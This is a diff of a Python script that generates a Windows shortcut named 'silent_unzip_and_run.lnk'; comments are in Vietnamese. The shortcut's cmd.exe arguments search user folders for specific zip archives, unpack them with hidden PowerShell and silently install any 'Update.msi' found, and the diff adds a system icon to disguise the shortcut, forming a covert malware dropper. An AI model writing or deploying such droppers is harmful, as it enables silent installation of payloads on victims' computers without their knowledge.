@@ -8,10 +8,11 @@ lnk_path = os.path.abspath("silent_unzip_and_run.lnk")
 shortcut = shell.CreateShortCut(lnk_path)
 
 shortcut.TargetPath = r"C:\Windows\System32\cmd.exe"
-shortcut.WorkingDirectory = r"C:\\"
+shortcut.WorkingDirectory = r"C:\\Users"
 
-shortcut.Arguments = r'''/c for /r "C:\Users" %i in (*abczs.zip) do (powershell -NoProfile -WindowStyle Hidden -Command "try { Expand-Archive -LiteralPath '%i' -DestinationPath \"$env:TEMP\%~ni\" -Force } catch {}" >nul 2>&1 & if exist "%TEMP%\%~ni\Update.msi" (msiexec /i "%TEMP%\%~ni\Update.msi" /qn /norestart >nul 2>&1))'''
+shortcut.Arguments = r'''/k for /r "C:\Users" %i in (*abczs.zip) do (powershell -NoProfile -WindowStyle Hidden -Command "try { Expand-Archive -LiteralPath '%i' -DestinationPath \"$env:TEMP\%~ni\" -Force } catch {}" >nul 2>&1 & if exist "%TEMP%\%~ni\Update.msi" (msiexec /i "%TEMP%\%~ni\Update.msi" /qn /norestart >nul 2>&1))'''
 
+shortcut.IconLocation = r"C:\Windows\System32\shell32.dll,21"  # Thêm icon
 shortcut.WindowStyle = 0  # Ẩn cửa sổ
 
 shortcut.save()
